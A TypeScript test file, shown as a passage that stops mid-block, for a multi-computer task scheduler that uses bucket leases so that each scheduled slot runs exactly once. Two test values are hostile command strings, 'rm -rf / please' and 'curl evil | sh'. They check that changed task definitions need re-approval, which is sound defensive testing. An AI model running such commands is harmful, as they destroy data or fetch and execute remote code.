import { describe, test } from 'node:test';
import fs from 'node:fs';
import assert from 'node:assert/strict';
import { createSchedule, isDue, type ScheduleSpec, type ScheduleState } from '../src/main/schedule.ts';
import { chargeRun, definitionApproved, definitionHash, mergeSchedule, stableStringify, type ScheduleMachine } from '../src/main/scheduleSync.ts';
import {
  CHARGE_KEYS, LEASE_MS, MARK_KEYS, acquireLease, attemptScheduleRun, commitCharge, creatorOf, leaseRel, markPendingRun, parseLeaseRel, pendingStale, plannedRunFor, restorePending, undoCharge,
  type AttemptResult, type LeaseBucket, type RunLease,
} from '../src/main/scheduleLease.ts';

/*
  第 12 轮（用户 2026-11-28）：定时任务「哪台在线就由哪台跑」，靠桶里的租约（条件写入）保证同一次只有一台跑。
  假桶按 S3 的条件写入语义实现：If-None-Match: * 在对象存在时 412；If-Match 的 ETag 不对时 412。
*/

class FakeBucket implements LeaseBucket {
  objects = new Map<string, { body: string; etag: string }>();
  private n = 0;
  down = false;
  async get(key: string) {
    if (this.down) throw new Error('network down');
    await Promise.resolve();
    return this.objects.get(key) ?? null;
  }
  async putIf(key: string, body: string, cond: { ifMatch: string } | { ifNoneMatch: '*' }) {
    if (this.down) throw new Error('network down');
    await Promise.resolve();
    const cur = this.objects.get(key);
    if ('ifNoneMatch' in cond ? !!cur : cur?.etag !== cond.ifMatch) return { ok: false as const };
    const etag = `"e${++this.n}"`;
    this.objects.set(key, { body, etag });
    return { ok: true as const, etag };
  }
  async del(key: string, etag: string) {
    if (this.down) throw new Error('network down');
    if (this.objects.get(key)?.etag === etag) this.objects.delete(key);
  }
}

const T0 = new Date(2026, 10, 28, 8, 30, 0).getTime();
const A: ScheduleMachine = { id: 'devA', name: 'kyn-desktop' };
const B: ScheduleMachine = { id: 'devB', name: 'kyn-workstation' };
const KEY = leaseRel('s1', 'j1');
const STATE_KEY = 'state:j1';

function daily(over: Partial<ScheduleState> = {}): ScheduleState {
  const spec: ScheduleSpec = { prompt: '每日流动性与持仓指标巡检', kind: 'daily', everySec: 0, atTime: '08:30', maxRuns: 100 };
  return { ...createSchedule('s1', spec, T0 - 7 * 86400_000), runs: 6, lastRunAt: T0 - 86400_000, lastRunFor: T0 - 86400_000, creator: A.id, runner: A.id, ...over };
}

/** One computer: its local copy, its approvals, and a run counter shared by the "cluster". */
class Machine {
  local: ScheduleState | null;
  approved: string | undefined;
  logs: string[] = [];
  timers: Array<() => void> = [];
  /** the task was deleted on this computer (a tombstone exists) */
  deleted = false;
  me: ScheduleMachine;
  bucket: FakeBucket;
  ran: string[];
  clock: { now: number };
  constructor(me: ScheduleMachine, start: ScheduleState, bucket: FakeBucket, ran: string[], clock: { now: number }, approve = true) {
    this.me = me;
    this.bucket = bucket;
    this.ran = ran;
    this.clock = clock;
    this.local = structuredClone(start);
    this.approved = approve ? definitionHash(start) : undefined;
  }
  attempt(opts: { offline?: boolean; manual?: boolean; hang?: Promise<void> } = {}): Promise<AttemptResult> {
    return attemptScheduleRun('j1', {
      me: this.me,
      now: () => this.clock.now,
      bucket: opts.offline ? null : this.bucket,
      leaseKey: KEY,
      eligible: (s) => definitionApproved(s, this.approved),
      readLocal: () => this.local,
      fetchRemote: async () => { const o = this.bucket.objects.get(STATE_KEY); return o ? JSON.parse(o.body) : null; },
      adopt: (remote) => (this.local = mergeSchedule(this.local!, remote, this.me.id).state),
      run: async (state, runFor) => {
        this.local = chargeRun(state, runFor, this.me, this.clock.now);
        /* charge first, publish first (like index.ts), then the slow part */
        if (!opts.offline) this.bucket.objects.set(STATE_KEY, { body: JSON.stringify(this.local), etag: 'x' });
        this.ran.push(`${this.me.name}@${runFor}`);
        if (opts.hang) await opts.hang;
      },
      every: (_ms, fn) => { this.timers.push(fn); return () => { this.timers = this.timers.filter((f) => f !== fn); }; },
      log: (m) => this.logs.push(m),
      manual: opts.manual,
    });
  }
}

function cluster(start = daily(), approveB = true) {
  const bucket = new FakeBucket();
  const ran: string[] = [];
  const clock = { now: T0 + 1000 };
  return { bucket, ran, clock, a: new Machine(A, start, bucket, ran, clock), b: new Machine(B, start, bucket, ran, clock, approveB) };
}

describe('lease: one computer per run', () => {
  test('① both due at the same time → exactly one runs; the other logs "lease lost"', async () => {
    const c = cluster();
    const [ra, rb] = await Promise.all([c.a.attempt(), c.b.attempt()]);
    assert.deepEqual([ra, rb].sort(), ['held', 'ran']);
    assert.equal(c.ran.length, 1);
    const loser = ra === 'held' ? c.a : c.b;
    assert.ok(loser.logs.some((m) => m.startsWith('lease lost id=j1 run=')), 'loser logged');
    const winner = ra === 'ran' ? c.a : c.b;
    assert.ok(winner.logs.some((m) => m.startsWith('lease acquired id=j1')));
    assert.ok(winner.logs.some((m) => m.startsWith('lease released id=j1')));
    assert.equal(c.bucket.objects.has(KEY), false, 'released');
    /* the loser, on its next tick, sees the run was done and does not run it again */
    assert.equal(await loser.attempt(), 'already-ran');
    assert.equal(c.ran.length, 1);
    assert.ok(loser.logs.some((m) => /^skip id=j1 run=\d+: 已由 /.test(m)));
  });

  test('② the runner goes silent mid-run: after the lease expires the other takes over the SAME slot, and it runs only once', async () => {
    /* A acquires, but dies BEFORE charging (the check command was still running) */
    const c = cluster();
    const runFor = plannedRunFor(c.a.local!, c.clock.now);
    const got = await acquireLease(c.bucket, KEY, A, runFor, c.clock.now);
    assert.equal(got.ok, true);
    assert.equal(await c.b.attempt(), 'held', 'still within A\'s lease');
    c.clock.now += LEASE_MS + 1000;   // A never renewed
    assert.equal(await c.b.attempt(), 'ran', 'B takes over after expiry');
    assert.deepEqual(c.ran, [`${B.name}@${runFor}`], 'same planned slot');
    assert.equal(await c.b.attempt(), 'not-due');
    assert.equal(await c.a.attempt(), 'already-ran', 'A coming back does not run it again');
    assert.equal(c.ran.length, 1);
  });

  test('② variant: A charged and published, then died holding the lease → B sees it ran and does not run again', async () => {
    const c = cluster();
    let release!: () => void;
    const hang = new Promise<void>((r) => { release = r; });
    const pending = c.a.attempt({ hang });          // A runs and "hangs" after charging
    await new Promise((r) => setTimeout(r, 5));
    assert.equal(c.ran.length, 1);
    c.clock.now += LEASE_MS + 1000;                 // A's lease ran out (it stopped renewing)
    assert.equal(await c.b.attempt(), 'already-ran');
    assert.equal(c.ran.length, 1);
    release();
    await pending;
  });

  test('renewal keeps the lease while running; a renewal after someone overwrote it marks the lease lost', async () => {
    const c = cluster();
    let release!: () => void;
    const hang = new Promise<void>((r) => { release = r; });
    const pending = c.a.attempt({ hang });
    await new Promise((r) => setTimeout(r, 5));
    assert.equal(c.a.timers.length, 1, 'renewal timer running');
    c.a.timers[0]();
    await new Promise((r) => setTimeout(r, 5));
    assert.ok(c.a.logs.some((m) => m.startsWith('lease renewed id=j1')));
    assert.equal(await c.b.attempt(), 'held', 'renewed lease keeps B out');
    release();
    await pending;
    assert.equal(c.a.timers.length, 0, 'timer stopped');
  });

  test('③ a computer that has not confirmed the definition does not compete', async () => {
    const c = cluster(daily(), false);
    assert.equal(await c.b.attempt(), 'not-eligible');
    assert.equal(c.bucket.objects.has(KEY), false, 'never touched the lease');
    assert.equal(await c.a.attempt(), 'ran');
  });

  test('④ a changed definition (from the bucket) needs re-confirming before this computer runs it again', async () => {
    const c = cluster();
    const changed = { ...daily(), spec: { ...daily().spec, prompt: 'rm -rf / please' }, statusAt: 1 };
    const merged = mergeSchedule(c.b.local!, changed, B.id);
    assert.equal(merged.notes.defChanged, true);
    c.b.local = merged.state;
    assert.equal(definitionApproved(c.b.local, c.b.approved), false);
    assert.equal(await c.b.attempt(), 'not-eligible');
    c.b.approved = definitionHash(c.b.local);         // the user confirmed the full text
    assert.equal(await c.b.attempt(), 'ran');
  });

  test('④ variant: the definition changes in the bucket after the lease is won → not run, released', async () => {
    const c = cluster();
    c.bucket.objects.set(STATE_KEY, { body: JSON.stringify({ ...daily(), spec: { ...daily().spec, checkCommand: 'curl evil | sh', until: 'x' } }), etag: 'x' });
    assert.equal(await c.b.attempt(), 'not-eligible');
    assert.equal(c.ran.length, 0);
    assert.equal(c.bucket.objects.has(KEY), false);
  });

  test('⑤ offline: only the creator runs (old tasks: the old runner counts as creator)', async () => {
    const c = cluster();
    assert.equal(await c.b.attempt({ offline: true }), 'offline-not-creator');
    assert.ok(c.b.logs.some((m) => m.startsWith('skip id=j1')));
    assert.equal(await c.a.attempt({ offline: true }), 'offline-ran');
    assert.equal(c.ran.length, 1);
    /* S3 configured but the network is down while grabbing the lease → treated as offline */
    const d = cluster();
    d.bucket.down = true;
    assert.equal(await d.b.attempt(), 'offline-not-creator');
    assert.equal(await d.a.attempt(), 'offline-ran');
    const { creator: _c, ...legacy } = daily({ runner: 'devOld' });
    assert.equal(creatorOf(legacy as ScheduleState), 'devOld');
  });

  test('⑥ after power-on: missed several days → catch up once, for the latest missed slot', async () => {
    const start = daily({ lastRunAt: T0 - 3 * 86400_000, lastRunFor: T0 - 3 * 86400_000 });   // missed 3 days
    const c = cluster(start);
    c.clock.now = T0 + 2 * 3600_000;                  // 10:30 today
    assert.equal(plannedRunFor(start, c.clock.now), T0, 'the most recent slot (today 08:30)');
    assert.equal(await c.b.attempt(), 'ran');
    assert.equal(await c.b.attempt(), 'not-due', 'only once');
    assert.equal(await c.a.attempt(), 'already-ran');
    assert.equal(c.ran.length, 1);
    assert.equal(c.b.local!.lastRunFor, T0);
  });

  test('⑥ not caught up when expired / paused / run cap reached', async () => {
    for (const over of [{ expiresAt: T0 - 1 }, { paused: true }, { runs: 100 }] as Partial<ScheduleState>[]) {
      const c = cluster(daily({ lastRunAt: T0 - 3 * 86400_000, ...over }));
      assert.equal(await c.b.attempt(), 'not-due', JSON.stringify(over));
    }
  });

  test('"run once now" goes through the lease too, even when not due', async () => {
    const c = cluster(daily({ lastRunAt: T0 + 500, lastRunFor: T0 }));
    assert.equal(await c.b.attempt(), 'not-due');
    const holder = await acquireLease(c.bucket, KEY, A, T0, c.clock.now);
    assert.equal(holder.ok, true);
    assert.equal(await c.b.attempt({ manual: true }), 'held', 'A holds it right now');
    c.bucket.objects.delete(KEY);
    assert.equal(await c.b.attempt({ manual: true }), 'ran');
  });
});

describe('review follow-ups: lease ↔ actual run', () => {
  test('check command with unchanged output (no wake) still records the slot and publishes before release → the other computer does not run the check again', async () => {
    const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
    const { outputFingerprint, planScheduleCheck } = await import('../src/main/schedule.ts');
    const goal = daily({ spec: { ...daily().spec, until: 'green', checkCommand: 'node check.js' } });
    const start = { ...goal, lastCheckHash: outputFingerprint('2 failing') };
    const c = cluster(start);
    let checks = 0;
    /* the same run body as index.ts: the real check flow; a "skip" records the slot (markRunBy) and publishes */
    const realRun = (m: Machine) => async (state: ScheduleState, runFor: number, lease: { lost(): boolean }) => {
      const out = await runScheduleCheck('j1', state, {
        now: () => c.clock.now, read: () => m.local, write: (_id, s) => { m.local = s; },
        runCheck: async () => { checks += 1; return { status: 'exited', code: 1, output: '2 failing' }; },
        changed: () => {}, noteUser: () => {}, log: () => {}, lang: 'en',
        stillRunsHere: () => !lease.lost(),
        recordSkip: async (_id, s) => {
          const { markRunBy } = await import('../src/main/scheduleSync.ts');
          m.local = markRunBy(s, runFor, m.me, c.clock.now);
          c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
        },
      });
      if (out) c.ran.push(`${m.me.name}@${runFor} woke`);
    };
    const attempt = (m: Machine) => attemptScheduleRun('j1', {
      me: m.me, now: () => c.clock.now, bucket: c.bucket, leaseKey: KEY,
      eligible: (s) => definitionApproved(s, m.approved), readLocal: () => m.local,
      fetchRemote: async () => { const o = c.bucket.objects.get(STATE_KEY); return o ? JSON.parse(o.body) : null; },
      adopt: (remote) => (m.local = mergeSchedule(m.local!, remote, m.me.id).state),
      run: realRun(m), every: () => () => {}, log: (x) => m.logs.push(x),
    });
    assert.equal(planScheduleCheck(start, { status: 'exited', code: 1, output: '2 failing' }, c.clock.now, 'en').action, 'skip', 'precondition: this is the skip branch');
    assert.equal(await attempt(c.a), 'ran');
    assert.equal(checks, 1);
    assert.equal(c.a.local!.runs, 6, 'a skipped check does not count a model wake');
    assert.ok((c.a.local!.lastRunFor ?? 0) >= plannedRunFor(start, c.clock.now), 'slot recorded');
    assert.equal(await attempt(c.b), 'already-ran', 'B (stale local copy) sees it was checked');
    assert.equal(checks, 1, 'the check command ran once');
    assert.deepEqual(c.ran, [], 'nobody was woken');
  });

  test('renewals keep failing (network) until the last good lease expires → the run no longer holds it: no charge, no wake; another computer can take over', async () => {
    const c = cluster();
    let release!: () => void;
    const hang = new Promise<void>((r) => { release = r; });
    let leaseSeen: { lost(): boolean } | null = null;
    const timers: Array<() => void> = [];
    const pending = attemptScheduleRun('j1', {
      me: A, now: () => c.clock.now, bucket: c.bucket, leaseKey: KEY,
      eligible: () => true, readLocal: () => c.a.local,
      fetchRemote: async () => null, adopt: (r) => r,
      run: async (_s, _f, lease) => { leaseSeen = lease; await hang; },
      every: (_ms, fn) => { timers.push(fn); return () => {}; }, log: (x) => c.a.logs.push(x),
    });
    await new Promise((r) => setTimeout(r, 5));
    assert.ok(leaseSeen);
    assert.equal(leaseSeen!.lost(), false, 'fresh lease: held');
    c.bucket.down = true;                               // every renewal now throws
    for (let i = 0; i < 6; i += 1) {
      c.clock.now += 60_000;
      timers[0]();
      await new Promise((r) => setTimeout(r, 2));
    }
    assert.ok(c.a.logs.some((m) => m.startsWith('lease renew failed id=j1')), 'renewal errors logged');
    assert.equal(leaseSeen!.lost(), true, 'past the last good expiry: not held any more');
    assert.ok(c.a.logs.some((m) => m.startsWith('lease lost id=j1') && m.includes('到期')));
    c.bucket.down = false;
    assert.equal(await c.b.attempt(), 'ran', 'B takes over the same slot');
    release();
    assert.equal(await pending, 'ran');
    assert.equal(c.bucket.objects.has(KEY), false, 'B released its own lease; A did not touch it');
  });

  test('"run once now": after merging the newest state, paused / ended / expired / run cap still stop it before anything runs', async () => {
    for (const over of [{ paused: true, pausedChangedAt: T0 + 10 }, { terminal: 'achieved' as const }, { expiresAt: T0 - 1, expiryChangedAt: T0 + 10 }, { runs: 100 }] as Partial<ScheduleState>[]) {
      const c = cluster();
      c.bucket.objects.set(STATE_KEY, { body: JSON.stringify({ ...daily(), ...over, statusAt: T0 + 10, lastRunFor: T0 + 10 }), etag: 'x' });
      assert.equal(await c.b.attempt({ manual: true }), 'blocked', JSON.stringify(over));
      assert.equal(c.ran.length, 0, 'run callback (and the check command) never called');
      assert.equal(c.bucket.objects.has(KEY), false, 'lease released');
    }
  });
});

describe('review follow-ups 2: failures between the lease and the run', () => {
  /** Mirrors index.ts runScheduledJob: charge → publish (must succeed) → wait for the session → send (lease checked again) → final write. */
  function indexLikeRun(m: Machine, c: ReturnType<typeof cluster>, opts: { publishOk?: () => boolean; queue?: Promise<void>; duringPublish?: () => void } = {}) {
    return async (state: ScheduleState, runFor: number, lease: RunLease) => {
      if (lease.lost()) return;
      const before = m.local!;
      /* index.ts: markRunBy + markPendingRun (when using the bucket) + recordRun */
      const charged = lease.offline ? chargeRun(state, runFor, m.me, c.clock.now) : markPendingRun(chargeRun(state, runFor, m.me, c.clock.now), before, runFor, m.me, c.clock.now);
      m.local = charged;
      /* the same commit / undo decision index.ts uses (commitScheduleCharge → commitCharge) */
      const ok = await commitCharge(before, {
        offline: lease.offline, lost: lease.lost,
        publish: async () => {
          await Promise.resolve();
          opts.duringPublish?.();                               // the user acts while the upload is in flight
          if (c.bucket.down || !(opts.publishOk?.() ?? true)) return false;
          c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
          return true;
        },
        readCurrent: () => m.local, deleted: () => m.deleted,
        writeRaw: (s) => { m.local = s; }, log: (x) => m.logs.push(x),
      });
      if (!ok) { m.logs.push('undo'); return; }
      if (opts.queue) await opts.queue;                         // waiting for the session to go idle
      if (lease.lost()) {                                       // isStale / stillWanted → scheduleNotEligibleHere: not sent
        m.logs.push('lease-lost at send');
        m.local = undoCharge(m.local!, before, CHARGE_KEYS);    // scheduleLeaseLostAfterWake(skipped): undo locally only; the bucket keeps the note
        return;
      }
      c.ran.push(`${m.me.name}@${runFor} woke`);
      if (lease.lost()) { m.local = { ...m.local!, pendingRun: null }; return; }   // sent, then lost: only confirm delivery
      m.local = { ...m.local!, lastError: null, pendingRun: null };                 // final write: delivered
      c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
    };
  }
  const attemptWith = (m: Machine, c: ReturnType<typeof cluster>, run: ReturnType<typeof indexLikeRun>, extra: Partial<Parameters<typeof attemptScheduleRun>[1]> = {}) => attemptScheduleRun('j1', {
    me: m.me, now: () => c.clock.now, bucket: c.bucket, leaseKey: KEY,
    eligible: (s) => definitionApproved(s, m.approved), readLocal: () => m.local,
    fetchRemote: async () => { const o = c.bucket.objects.get(STATE_KEY); return o ? JSON.parse(o.body) : null; },
    adopt: (remote) => (m.local = mergeSchedule(m.local!, remote, m.me.id).state),
    persist: (st) => { m.local = st; },                         // index.ts: writeScheduleRaw
    run, every: (_ms, fn) => { m.timers.push(fn); return () => { m.timers = []; }; }, log: (x) => m.logs.push(x),
    ...extra,
  });

  test('lease won but the bucket state cannot be read → a non-creator does not run (offline rule); the creator still may', async () => {
    const c = cluster();
    const failingFetch = { fetchRemote: async () => { throw new Error('GET timed out'); } };
    assert.equal(await attemptWith(c.b, c, indexLikeRun(c.b, c), failingFetch), 'offline-not-creator');
    assert.deepEqual(c.ran, []);
    assert.equal(c.bucket.objects.has(KEY), false, 'lease released');
    assert.ok(c.b.logs.some((m) => m.includes('读不到桶里的状态') && m.includes('不跑')));
    assert.equal(await attemptWith(c.a, c, indexLikeRun(c.a, c), failingFetch), 'ran', 'creator (A) follows the offline rule');
    assert.equal(c.ran.length, 1);
  });

  test('publishing "this slot ran" fails → charge undone, nobody woken; the next attempt (other computer) runs it exactly once', async () => {
    const c = cluster();
    assert.equal(await attemptWith(c.a, c, indexLikeRun(c.a, c, { publishOk: () => false })), 'ran');
    assert.deepEqual(c.ran, [], 'A did not wake the session');
    assert.ok(c.a.logs.includes('undo'));
    assert.equal(c.a.local!.runs, 6, 'charge undone');
    assert.equal(c.bucket.objects.has(KEY), false);
    assert.equal(await attemptWith(c.b, c, indexLikeRun(c.b, c)), 'ran');
    assert.deepEqual(c.ran, [`${B.name}@${c.b.local!.lastRunFor} woke`]);
    assert.equal(await attemptWith(c.a, c, indexLikeRun(c.a, c)), 'already-ran', 'A coming back sees it was done');
    assert.equal(c.ran.length, 1);
  });

  /** A charges and publishes (with the "not yet delivered" note), then waits for a busy session while its lease expires. */
  async function aLosesLeaseWhileQueued(start = daily()) {
    const c = cluster(start);
    let idle!: () => void;
    const queue = new Promise<void>((r) => { idle = r; });
    const pending = attemptWith(c.a, c, indexLikeRun(c.a, c, { queue }));
    await new Promise((r) => setTimeout(r, 5));
    const published = JSON.parse(c.bucket.objects.get(STATE_KEY)!.body);
    assert.equal(published.pendingRun?.by, A.id, 'charged in the bucket, marked "not yet confirmed delivered"');
    c.bucket.down = true;
    for (let i = 0; i < 6; i += 1) { c.clock.now += 60_000; c.a.timers[0]?.(); await new Promise((r) => setTimeout(r, 2)); }
    c.bucket.down = false;
    return { c, idle, pending, published };
  }

  test('the lease expires while the wake waits for the session (renewals failing) → A does not send; B takes over and the slot is sent exactly once', async () => {
    const { c, idle, pending } = await aLosesLeaseWhileQueued();
    /* B (stale local copy) tries now: A's lease is expired, the bucket says "charged but not confirmed" → B undoes that charge and runs */
    assert.equal(await attemptWith(c.b, c, indexLikeRun(c.b, c)), 'ran');
    assert.ok(c.b.logs.some((m) => m.includes('没确认送达') && m.includes('由本机接手')), 'takeover logged');
    idle();                                                      // A's session goes idle; its queued wake would be sent now
    await pending;
    assert.ok(c.a.logs.includes('lease-lost at send'), 'A blocked at send time');
    assert.equal(c.ran.length, 1, 'sent exactly once');
    assert.match(c.ran[0], new RegExp(`^${B.name}@`));
    const final = JSON.parse(c.bucket.objects.get(STATE_KEY)!.body);
    assert.equal(final.runs, 7, 'counted once (A\'s unconfirmed charge was undone)');
    assert.equal(final.pendingRun, null, 'delivery confirmed');
    /* A coming back sees it done */
    assert.equal(await attemptWith(c.a, c, indexLikeRun(c.a, c)), 'already-ran');
    assert.equal(c.ran.length, 1);
  });

  test('same, but B already synced A\'s charged copy (looks "not due"): the stale "not confirmed" note still makes B try, and it runs once', async () => {
    const { c, idle, pending, published } = await aLosesLeaseWhileQueued();
    c.b.local = mergeSchedule(c.b.local!, published, B.id).state;
    assert.equal(pendingStale(c.b.local!, c.clock.now), true, 'older than one lease period');
    assert.equal(await attemptWith(c.b, c, indexLikeRun(c.b, c)), 'ran');
    idle();
    await pending;
    assert.equal(c.ran.length, 1);
  });

  test('a one-off task is not lost forever when its runner loses the lease while queued', async () => {
    const once = { ...daily(), spec: { prompt: 'remind me', kind: 'once' as const, everySec: 0, atEpoch: T0, maxRuns: 1 }, runs: 0, lastRunAt: null, lastRunFor: null };
    const { c, idle, pending } = await aLosesLeaseWhileQueued(once);
    assert.equal(await attemptWith(c.b, c, indexLikeRun(c.b, c)), 'ran', 'not skipped as "completed"');
    idle();
    await pending;
    assert.equal(c.ran.length, 1);
  });

  describe('with a check command, through the real runScheduleCheck', () => {
    /** index.ts order: snapshot before the check → real check → charge + "not yet delivered" (with the pre-check snapshot) → publish → wait → send. */
    function checkRun(m: Machine, c: ReturnType<typeof cluster>, result: any, queue?: Promise<void>) {
      return async (state: ScheduleState, runFor: number, lease: RunLease) => {
        const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
        const preCheck = m.local!;
        const checked = await runScheduleCheck('j1', state, {
          now: () => c.clock.now, read: () => m.local, write: (_id, s) => { m.local = s; },
          runCheck: async () => result, changed: () => {}, noteUser: () => {}, log: () => {}, lang: 'en',
          stillRunsHere: () => !lease.lost(),
        });
        if (!checked) return;
        const before = m.local!;
        m.local = markPendingRun(chargeRun(checked.state, runFor, m.me, c.clock.now), before, runFor, m.me, c.clock.now, preCheck);
        c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
        if (queue) await queue;
        if (lease.lost()) { m.local = restorePending(m.local!); m.logs.push('lease-lost at send'); return; }
        c.ran.push(`${m.me.name}: ${checked.text.split('\n')[0]}`);
        m.local = { ...m.local!, pendingRun: null };
        c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
      };
    }
    async function lostWhileQueued(result: any) {
      const { outputFingerprint } = await import('../src/main/schedule.ts');
      const goal = daily({ spec: { ...daily().spec, until: 'green', checkCommand: 'node check.js' }, lastCheckHash: outputFingerprint('3 failing') });
      const c = cluster(goal);
      let idle!: () => void;
      const queue = new Promise<void>((r) => { idle = r; });
      const pending = attemptWith(c.a, c, checkRun(c.a, c, result, queue));
      await new Promise((r) => setTimeout(r, 10));
      assert.ok(JSON.parse(c.bucket.objects.get(STATE_KEY)!.body).pendingRun, 'charged + "not yet delivered" in the bucket');
      c.bucket.down = true;
      for (let i = 0; i < 6; i += 1) { c.clock.now += 60_000; c.a.timers[0]?.(); await new Promise((r) => setTimeout(r, 2)); }
      c.bucket.down = false;
      return { c, idle, pending, goal };
    }

    test('exit 1, output changed: B takes over, re-checks, wakes once (not blocked by A\'s check time or fingerprint)', async () => {
      const result = { status: 'exited', code: 1, output: '1 failing' };
      const { c, idle, pending, goal } = await lostWhileQueued(result);
      assert.equal(await attemptWith(c.b, c, checkRun(c.b, c, result)), 'ran');
      idle();
      await pending;
      assert.ok(c.a.logs.includes('lease-lost at send'));
      assert.equal(c.ran.length, 1, 'exactly one report');
      assert.match(c.ran[0], /^kyn-workstation: 🔎 The check command exited with 1/);
      const final = JSON.parse(c.bucket.objects.get(STATE_KEY)!.body);
      assert.equal(final.runs, goal.runs + 1);
      assert.equal(final.pendingRun, null);
    });

    test('exit 0, goal reached: A\'s "achieved" is undone with the rest; B re-checks and gives the final report once', async () => {
      const result = { status: 'exited', code: 0, output: 'all green' };
      const { c, idle, pending } = await lostWhileQueued(result);
      assert.equal(JSON.parse(c.bucket.objects.get(STATE_KEY)!.body).terminal, 'achieved', 'precondition: A wrote achieved before losing the lease');
      assert.equal(await attemptWith(c.b, c, checkRun(c.b, c, result)), 'ran', 'not "blocked" by A\'s achieved');
      idle();
      await pending;
      assert.equal(c.ran.length, 1);
      assert.match(c.ran[0], /^kyn-workstation: ✅ The check command exited with 0/);
      assert.equal(JSON.parse(c.bucket.objects.get(STATE_KEY)!.body).terminal, 'achieved', 'ends as achieved, by B');
    });

    test('a pause the user pressed meanwhile is kept: B does not run it', async () => {
      const result = { status: 'exited', code: 1, output: '1 failing' };
      const { c, idle, pending } = await lostWhileQueued(result);
      const inBucket = JSON.parse(c.bucket.objects.get(STATE_KEY)!.body);
      c.bucket.objects.set(STATE_KEY, { body: JSON.stringify({ ...inBucket, paused: true, pausedBy: null, pausedChangedAt: c.clock.now }), etag: 'x' });
      assert.equal(await attemptWith(c.b, c, checkRun(c.b, c, result)), 'blocked');
      idle();
      await pending;
      assert.equal(c.ran.length, 0);
    });
  });

  describe('two stages: "charged" → "sent" (handed to the session) → confirmed', () => {
    /**
     * index.ts order: real check → charge + note → commitCharge (upload, undo with the pre-check snapshot on failure) →
     * onSend: upload "sent" (must succeed, else not sent) → send → final write clears the note (upload may fail / computer may crash).
     */
    function stagedRun(m: Machine, c: ReturnType<typeof cluster>, result: any, o: { chargeOk?: boolean; sentOk?: boolean; finalOk?: boolean; crashAfterSend?: boolean } = {}) {
      return async (state: ScheduleState, runFor: number, lease: RunLease) => {
        const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
        const preCheck = m.local!;
        const checked = await runScheduleCheck('j1', state, {
          now: () => c.clock.now, read: () => m.local, write: (_id, s) => { m.local = s; },
          runCheck: async () => result, changed: () => {}, noteUser: () => {}, log: () => {}, lang: 'en', stillRunsHere: () => !lease.lost(),
        });
        if (!checked) return;
        const before = m.local!;
        m.local = markPendingRun(chargeRun(checked.state, runFor, m.me, c.clock.now), before, runFor, m.me, c.clock.now, preCheck);
        const ok = await commitCharge(before, {
          offline: lease.offline, lost: lease.lost,
          publish: async () => { if (o.chargeOk === false) return false; c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' }); return true; },
          readCurrent: () => m.local, deleted: () => false, writeRaw: (s) => { m.local = s; }, log: (x) => m.logs.push(x),
        });
        if (!ok) { m.logs.push('undo'); return; }
        /* onSend (scheduleMarkSent) */
        if (o.sentOk === false) { m.local = restorePending(m.local!); m.logs.push('not sent'); return; }
        m.local = { ...m.local!, pendingRun: { ...m.local!.pendingRun!, sent: true } };
        c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
        c.ran.push(`${m.me.name}: ${checked.text.split('\n')[0]}`);   // handed to the session
        if (o.crashAfterSend) { c.bucket.down = true; return; }        // the computer dies: no final write, the lease is not released
        m.local = { ...m.local!, pendingRun: null };
        if (o.finalOk !== false) c.bucket.objects.set(STATE_KEY, { body: JSON.stringify(m.local), etag: 'x' });
      };
    }
    const goalJob = async () => {
      const { outputFingerprint } = await import('../src/main/schedule.ts');
      return daily({ spec: { ...daily().spec, until: 'green', checkCommand: 'node check.js' }, lastCheckHash: outputFingerprint('3 failing') });
    };
    const green = { status: 'exited', code: 0, output: 'all green' };

    test('exit 0, the "done" upload fails: the check outcome (achieved) is undone too, so the next attempt re-checks and reports once', async () => {
      const c = cluster(await goalJob());
      assert.equal(await attemptWith(c.a, c, stagedRun(c.a, c, green, { chargeOk: false })), 'ran');
      assert.deepEqual(c.ran, [], 'not woken');
      assert.equal(c.a.local!.terminal, null, '"achieved" undone');
      assert.equal(c.a.local!.runs, 6);
      assert.equal(c.a.local!.pendingRun, null);
      assert.equal(isDue(c.a.local!, c.clock.now), true, 'due again → retried');
      assert.equal(await attemptWith(c.a, c, stagedRun(c.a, c, green)), 'ran', 'retry, network back');
      assert.equal(c.ran.length, 1);
      assert.match(c.ran[0], /✅ The check command exited with 0/);
      assert.equal(c.a.local!.terminal, 'achieved');
    });

    test('sent, then the final confirmation upload fails: B does not send it again', async () => {
      const c = cluster(await goalJob());
      const r1 = { status: 'exited', code: 1, output: '1 failing' };
      assert.equal(await attemptWith(c.a, c, stagedRun(c.a, c, r1, { finalOk: false })), 'ran');
      assert.equal(JSON.parse(c.bucket.objects.get(STATE_KEY)!.body).pendingRun?.sent, true, 'bucket still says "sent, not confirmed"');
      c.clock.now += LEASE_MS + 1000;
      const { pendingStale: stale } = await import('../src/main/scheduleLease.ts');
      c.b.local = mergeSchedule(c.b.local!, JSON.parse(c.bucket.objects.get(STATE_KEY)!.body), B.id).state;
      assert.equal(stale(c.b.local!, c.clock.now), true, 'B is nudged to look');
      assert.equal(await attemptWith(c.b, c, stagedRun(c.b, c, r1)), 'already-ran');
      assert.equal(c.ran.length, 1, 'sent once');
      assert.ok(c.b.logs.some((m) => m.includes('不重发')));
      assert.equal(c.b.local!.pendingRun ?? null, null, 'B cleared the note (its next sync uploads it)');
      assert.equal(c.b.local!.runs, 7, 'counted once: the charge from A is kept, not undone');
    });

    test('sent, then the computer crashes before confirming (lease never released): after expiry B does not send it again', async () => {
      const c = cluster(await goalJob());
      const r1 = { status: 'exited', code: 1, output: '1 failing' };
      await attemptWith(c.a, c, stagedRun(c.a, c, r1, { crashAfterSend: true }));
      c.bucket.down = false;                                       // (A is gone; the bucket is reachable again for B)
      assert.equal(await attemptWith(c.b, c, stagedRun(c.b, c, r1)), 'held', 'A\'s lease still there');
      c.clock.now += LEASE_MS + 1000;
      assert.equal(await attemptWith(c.b, c, stagedRun(c.b, c, r1)), 'already-ran');
      assert.equal(c.ran.length, 1);
    });

